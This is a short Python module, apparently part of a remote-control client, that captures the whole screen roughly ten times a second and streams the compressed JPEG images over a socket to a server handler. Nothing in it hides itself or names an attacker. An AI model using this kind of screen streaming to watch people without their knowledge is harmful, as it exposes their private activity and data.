import io, typing
from PIL import ImageGrab
from zlib import compress
from time import sleep

if typing.TYPE_CHECKING:
    from ..handler import ServerHandler

def run(socketInstance: 'ServerHandler') -> None:
    socketInstance.isRecording = True
    socketInstance.socketInstance.send_packet('recording')

    while socketInstance.isRecording:
        screenshot = ImageGrab.grab()
        screenshot = screenshot.convert("RGB")

        byteArray = io.BytesIO()
        screenshot.save(byteArray, format = 'JPEG')

        data = compress(byteArray.getvalue())
        socketInstance.socketInstance.send_packet(data = data)
        sleep(0.10)
